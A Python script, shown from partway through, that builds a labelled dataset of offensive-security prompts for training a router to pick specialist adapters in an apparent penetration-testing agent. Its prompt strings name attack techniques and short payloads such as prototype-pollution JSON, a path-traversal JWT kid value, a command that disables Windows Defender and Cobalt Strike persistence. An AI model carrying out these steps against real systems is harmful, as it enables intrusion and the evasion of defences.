    ("Exploit ECS task definition to inject environment variable with attacker URL",  "cloud"),

    # ── researcher ─────────────────────────────────────────────────────────────
    ("HYPOTHESIS: timing difference of 200ms on valid usernames suggests user enumeration", "researcher"),
    ("PROBE: send 100 concurrent requests to test for race condition on balance endpoint", "researcher"),
    ("Standard tools found nothing on the target. Analyse behavioral anomalies.",     "researcher"),
    ("All known vulnerability scanners returned clean results. What unusual patterns exist?", "researcher"),
    ("The response size varies by 500 bytes for requests with X-User header present versus absent", "researcher"),
    ("Error on invalid format leaks internal template path: template: pdf.tmpl:14:1", "researcher"),
    ("Timing oracle confirmed: 300ms for hit, 10ms for miss on /api/validate-token",  "researcher"),
    ("HTTP request smuggling via TE.CL — Nginx strips TE header, upstream uses CL",  "researcher"),
    ("Race condition on POST /api/transfer — 10 concurrent requests bypassed balance check", "researcher"),
    ("Cache poisoning via unkeyed X-Forwarded-Host header — confirmed on CDN layer", "researcher"),
    ("Prototype pollution in merge() function — {\"__proto__\":{\"isAdmin\":true}} passed", "researcher"),
    ("JWT kid header allows SQL injection — kid=../../../../etc/passwd returns PEM error", "researcher"),
    ("The exhausted all known techniques and tools found nothing significant",         "researcher"),
    ("Standard approach produced no new findings. Analyse for novel attack surface.", "researcher"),
    ("Behavioral difference: /api/export?format=pdf takes 3x longer than format=json", "researcher"),
    ("Error leakage: internal hostnames appear in HTTP response headers on 5xx errors", "researcher"),
    ("DOM clobbering via named anchors bypasses the sanitiser — nonstandard technique", "researcher"),
    ("HYPOTHESIS: second-order SQL injection stored in profile bio executed in admin panel", "researcher"),
    ("Mutation XSS via mXSS — sanitiser output differs from browser parsing",        "researcher"),
    ("Side-channel attack via network timing to distinguish valid from invalid JWTs", "researcher"),
    ("HTTP/2 h2c upgrade bypass — load balancer strips hop-by-hop headers allowing internal access", "researcher"),
    ("PROBE: test for dangling markup injection in Content-Security-Policy header",   "researcher"),
    ("Novel technique: abusing CSS injection to exfiltrate CSRF tokens character by character", "researcher"),
    ("Discover unknown attack surface by analysing behavioural differences in API responses", "researcher"),
    ("HYPOTHESIS: the PDF export feature uses Chromium headless — test for SSRF via file:// protocol", "researcher"),
    ("All tools exhausted. Need to reason beyond training corpus for next step.",     "researcher"),
    ("Unexplained 503 on specific user IDs — could indicate shadow banning or different backend", "researcher"),
    ("Request with Accept: application/json returns different content than Accept: text/html", "researcher"),
    ("PROBE: test if GraphQL aliases can be used to bypass field-level rate limiting", "researcher"),
    ("Cache deception attack — public cache stores authenticated content for /api/me", "researcher"),

    # ── executor ───────────────────────────────────────────────────────────────
    ("Fix the command: gau -d supplier.meesho.com — error: unknown flag '-d'",        "executor"),
    ("Correct this command: httpx -l hosts.txt --status-code — status-code not valid", "executor"),
    ("The command failed: amass intel -d target.com — wrong subcommand, use amass enum", "executor"),
    ("nmap --sV returned error: unrecognized option. Correct flag is -sV",            "executor"),
    ("subfinder -x -d target.com failed: unknown flag '-x'. Remove the invalid flag.", "executor"),
    ("Validate and correct: nuclei -target target.com -templates cves/ — wrong flags", "executor"),
    ("Command error: ffuf -u URL -wordlist file — use -w not -wordlist",              "executor"),
    ("Fix: gobuster dir -url URL -wordlist file — should be -u and -w flags",         "executor"),
    ("Correct the command syntax: sqlmap -url 'http://target.com' should use -u",    "executor"),
    ("katana -url https://target.com failed — correct flag is -u not -url",          "executor"),
    ("dnsx -l hosts.txt -resp — correct flag for response is -resp-only or -a",      "executor"),
    ("The placeholder <TARGET_IP> was not replaced in: nmap -sV <TARGET_IP>",        "executor"),
    ("Replace all placeholders in: subfinder -d <YOUR_DOMAIN> -o output.txt",        "executor"),
    ("Fabricated output detected in command: echo 'Status: 200' — generate real cmd", "executor"),
    ("Verify and fix the flags: waybackurls -d target.com — -d flag does not exist", "executor"),
    ("Command validation failed: feroxbuster --url URL — should be -u URL",          "executor"),
    ("Fix the incorrect flag usage: curl --header 'Host: target' — should be -H",    "executor"),
    ("The generated command contains an invalid argument. Correct it.",               "executor"),
    ("Retry with corrected flags after the previous command returned an error.",      "executor"),
    ("Generate the corrected version of the command that failed with unknown flag.",  "executor"),
    ("Remove the invalid -d flag from: gau -d target.com and use positional argument", "executor"),
    ("The tool output showed 'flag provided but not defined'. Fix the command flags.", "executor"),
    ("Validate the command before execution and correct any invalid flags.",           "executor"),
    ("Replace template placeholders like YOUR_TARGET with the actual domain name.",   "executor"),
    ("The model generated: curl -X GET https://target.com/<endpoint> — fix placeholder", "executor"),
    ("Command failed with 'missing required argument'. Add the required argument.",   "executor"),
    ("Rewrite the corrected command without the invalid flag that caused the error.", "executor"),
    ("The flags -sc and -status-code differ by tool version. Validate which is correct.", "executor"),
    ("Execute the pre-validated command exactly as provided without modification.",   "executor"),
    ("Extract the exact shell command from the model response for execution.",        "executor"),

    # ── analyst ────────────────────────────────────────────────────────────────
    ("Extract all subdomains and live endpoints from the subfinder and httpx output", "analyst"),
    ("Analyse the nuclei scan results and classify all findings by severity",         "analyst"),
    ("Parse the nmap output and extract all open ports, services, and versions",      "analyst"),
    ("Summarise the ffuf directory brute-force results — which paths returned 200?",  "analyst"),
    ("Interpret the sqlmap output and determine if SQLi is confirmed",                "analyst"),
    ("Extract the CVSS score and remediation steps from the vulnerability report",    "analyst"),
    ("Classify this finding as critical, high, medium, or low severity",              "analyst"),
    ("Write the HackerOne report for the confirmed IDOR vulnerability",               "analyst"),
    ("Analyse the tool output and extract: subdomains, IPs, tech stack, anomalies",   "analyst"),
    ("Parse the nikto scan output and summarise potential vulnerabilities",            "analyst"),
    ("Interpret the Burp Suite scan results for the web application",                 "analyst"),
    ("Extract structured JSON findings from the automated tool output",               "analyst"),
    ("Determine if the discovered behavior constitutes a valid bug bounty finding",   "analyst"),
    ("Classify and prioritise all vulnerabilities found in the scan output",          "analyst"),
    ("Write a formal vulnerability report with PoC steps and impact analysis",       "analyst"),
    ("Analyse the response headers and cookies for security misconfigurations",       "analyst"),
    ("Parse the bloodhound JSON output to identify the highest-impact attack path",  "analyst"),
    ("Interpret the cloud audit findings and determine the blast radius",              "analyst"),
    ("Assess the CVSS score for the reflected XSS in the search parameter",          "analyst"),
    ("Summarise what was found in the engagement so far: targets, vulns, next steps", "analyst"),
    ("Extract all unique parameters from the URL list for further testing",           "analyst"),
    ("Identify all endpoints returning sensitive data in the API responses",           "analyst"),
    ("Analyse the anomalies detected in the engagement knowledge store",               "analyst"),
    ("Determine the impact of the leaked API key found in the JavaScript bundle",     "analyst"),
    ("Write the executive summary section of the penetration test report",            "analyst"),
    ("Extract all credentials and tokens from the tool output",                       "analyst"),
    ("Prioritise the next test targets based on discovered attack surface",           "analyst"),
    ("Assess whether the timing difference constitutes a valid security issue",       "analyst"),
    ("Interpret the GraphQL introspection results for security implications",         "analyst"),
    ("Classify the S3 bucket misconfiguration finding and estimate business impact",  "analyst"),

    # ── planner ────────────────────────────────────────────────────────────────
    ("Create a step-by-step attack plan for testing the OAuth2 implementation",       "planner"),
    ("We found 3 subdomains but all are behind Cloudflare. Plan the next steps.",     "planner"),
    ("All recon tools found nothing new. Propose a revised attack strategy.",         "planner"),
    ("Design a structured bug bounty test plan for the supplier API",                 "planner"),
    ("Phase: fingerprint complete. Define the next phase objectives and tools.",      "planner"),
    ("Propose the highest-value next action given the current engagement state",      "planner"),
    ("The standard approach found nothing. Re-plan the engagement strategy.",         "planner"),
    ("After null step: generate a new attack hypothesis to explore",                  "planner"),
    ("Decompose the goal 'find RCE on target.com' into specific actionable steps",   "planner"),
    ("We are blocked by rate limiting. Plan an alternative testing strategy.",        "planner"),
    ("Create a prioritised list of attack vectors given the discovered tech stack",   "planner"),
    ("After recon phase: define test objectives for web vuln scan phase",             "planner"),
    ("Revise the plan after discovering the /admin endpoint is protected by 2FA",    "planner"),
    ("What is the optimal testing sequence given 4 hours remaining in the engagement?", "planner"),
    ("Plan the AD attack path from GenericWrite on ServiceAccount to domain admin",  "planner"),
    ("Design a cloud privilege escalation path from Lambda execution role",           "planner"),
    ("Propose the next highest-value action when known tools all return clean",       "planner"),
    ("Outline the methodology for testing IDOR across all discovered API endpoints",  "planner"),
    ("After 5 null steps, generate a fundamentally different attack hypothesis",      "planner"),
    ("Strategise the approach for an engagement with a 30-minute time limit",        "planner"),
    ("Plan the attack chain from initial SSRF to full cloud account compromise",     "planner"),
    ("Create a mind map of all attack vectors for a bug bounty against a fintech API", "planner"),
    ("Propose the testing order for maximum coverage with minimum tool noise",       "planner"),
    ("Revise the engagement plan based on unexpected 429 rate limiting on all endpoints", "planner"),
    ("Design the reporting structure for a multi-day bug bounty engagement",          "planner"),
]

# ── Pool C: cross-domain prompts with clear ownership ────────────────────────
CROSS_DOMAIN: list[tuple[str, str]] = [
    # Web entry → cloud pivot: the STEP is cloud
    ("We exploited SSRF on api.startup.io to reach the AWS metadata service. "
     "Now enumerate IAM roles, S3 buckets, and check for privilege escalation paths "
     "using the retrieved credentials.", "cloud"),
    # Network scan → service detection: htb owns this step
    ("nmap -sV -p- returned ports 22,80,443,8080 open on 10.10.10.5. "
     "Port 8080 runs Apache Tomcat 9.0.30. What vulnerability should we investigate?", "htb"),
    # CVE found during OSINT: vulhub owns exploitation
    ("Shodan shows the target runs Elasticsearch 7.5.1 with no authentication. "
     "CVE-2021-22145 applies. How do we exploit this?", "vulhub"),
    # Shell obtained, moving to AD enumeration: ad owns this step
    ("Got a reverse shell as www-data on 192.168.1.50. The /etc/hosts shows "
     "CORP-DC01.corp.local. Run BloodHound to map AD attack paths.", "ad"),
    # Finding anomaly during recon: researcher owns interpretation
    ("During ffuf enumeration, /api/v2/users returned 2341 bytes for IDs 1-50 "
     "but 89 bytes for ID 51. All standard vuln scans returned nothing. "
     "What does this behavioral inconsistency suggest?", "researcher"),
    # Reporting phase: analyst owns it
    ("We confirmed an IDOR at /api/v1/invoice/{id} that exposes other users' "
     "invoice data. No authentication required. Write the vulnerability report "
     "with CVSS score and remediation steps.", "analyst"),
    # Planning new phase after unexpected result
    ("We expected the admin panel at /admin but got 404. The Burp sitemap shows "
     "/management/dashboard returns 200 with a login form. Revise our test plan.", "planner"),
    # Command failed, needs correction
    ("httpx -l subdomains.txt --status-code --title failed with: Error: unknown flag "
     "'--status-code'. The correct flag is -sc. What is the corrected command?", "executor"),
    # Cloud IAM enumeration
    ("The Lambda function's execution role has iam:PassRole and ec2:RunInstances. "
     "Explain the privilege escalation path and provide the exploit commands.", "cloud"),
    # OSINT → subdomain takeover
    ("subfinder found dev.target.com pointing to a Heroku app that no longer exists. "
     "Verify the subdomain takeover and claim the DNS record.", "osint"),
    # Webapp XSS chaining
    ("Reflected XSS confirmed in the search parameter. The app uses HttpOnly cookies "
     "but the admin panel at /admin has no CSRF protection. Chain XSS to CSRF "
     "to create a new admin account.", "webapp"),
    # ATT&CK technique in a post-exploitation context
    ("Post-exploitation on a Windows host: disable Windows Defender using "
     "Set-MpPreference -DisableRealtimeMonitoring $true, then use Cobalt Strike "
     "to establish persistence via T1543.003.", "attack"),
]


def _extract_user_turns(path: Path, adapter: str, n: int) -> list[dict]:
    """Sample user-turn prompts from a processed JSONL file."""
    samples: list[dict] = []
    with open(path) as f:
        rows = [json.loads(l) for l in f if l.strip()]

    for ex in rows:
        msgs = ex.get("messages", [])
        for m in msgs:
            if m["role"] == "user":
                content = m["content"].strip()
                # Skip very short prompts (likely just a target name) or very long ones
                if 30 <= len(content) <= 600:
                    samples.append({"prompt": content, "adapter": adapter})

    random.shuffle(samples)
    return samples[:n]


def build_dataset(seed: int = 42) -> list[dict]:
    random.seed(seed)
    dataset: list[dict] = []

    # Pool A — extract from processed files (auto-discovered)
    file_to_adapter = _build_file_to_adapter(PROCESSED_DIR)
    print(f"Pool A: found {len(file_to_adapter)} processed files → adapters: "
          f"{sorted(set(file_to_adapter.values()))}")
    for filename, adapter in file_to_adapter.items():
        path = PROCESSED_DIR / filename
        examples = _extract_user_turns(path, adapter, POOL_A_PER_FILE)
        dataset.extend(examples)
        print(f"  {filename:<35} → {adapter:<12} ({len(examples)} examples)")

    # Pool B — hand-crafted ambiguous cases
    for prompt, adapter in AMBIGUOUS_CASES:
        dataset.append({"prompt": prompt, "adapter": adapter})

    # Pool C — cross-domain prompts
    for prompt, adapter in CROSS_DOMAIN:
        dataset.append({"prompt": prompt, "adapter": adapter})

    # Pool D — natural-language anchor prompts (short, diverse, per-adapter)
    # These give the MiniLM encoder clear short-form domain signals — Pool A
    # is too structured (LLM chat format) and doesn't generalise well to the
    # short natural-language queries that arrive during real routing.
    for prompt, adapter in NATURAL_ANCHORS:
        dataset.append({"prompt": prompt, "adapter": adapter})

    random.shuffle(dataset)
    return dataset


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--test",  action="store_true", help="Print 5 samples per pool, no write")
    parser.add_argument("--stats", action="store_true", help="Print per-adapter counts, no write")
    parser.add_argument("--out",   default=str(OUTPUT_PATH), help="Output path")
    args = parser.parse_args()

    dataset = build_dataset()

    if args.stats or args.test:
        from collections import Counter
        counts = Counter(d["adapter"] for d in dataset)
        print(f"Total examples: {len(dataset)}")
        print("\nPer-adapter distribution:")
        for adapter, n in sorted(counts.items()):
            bar = "█" * (n // 20)
            print(f"  {adapter:<12} {n:>5}  {bar}")

    if args.test:
        print("\n--- Sample prompts ---")
        shown: set[str] = set()
        for ex in dataset:
            if ex["adapter"] not in shown:
                shown.add(ex["adapter"])
                print(f"\n[{ex['adapter']}] {ex['prompt'][:200]!r}")
            if len(shown) >= 12:
                break
        return

    if args.stats:
        return

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w") as f:
        for ex in dataset:
            f.write(json.dumps(ex) + "\n")
    print(f"Written {len(dataset)} examples → {out}")


if __name__ == "__main__":
    main()
